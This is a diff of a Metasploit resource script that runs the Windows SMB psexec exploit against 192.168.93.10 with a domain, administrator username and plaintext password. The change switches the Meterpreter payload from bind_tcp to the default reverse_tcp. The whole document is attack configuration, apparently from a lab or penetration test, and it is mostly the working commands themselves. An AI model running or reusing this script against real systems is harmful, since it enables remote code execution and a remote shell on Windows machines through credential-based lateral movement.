@@ -5,6 +5,7 @@ use exploit/windows/smb/psexec
 set SMBDomain TEST
 set SMBUser administrator
 set SMBPass zxcASDqw123!!
-set payload windows/meterpreter/bind_tcp
+# default reverse_tcp
+# set payload windows/meterpreter/bind_tcp
 set rhosts 192.168.93.10
 run
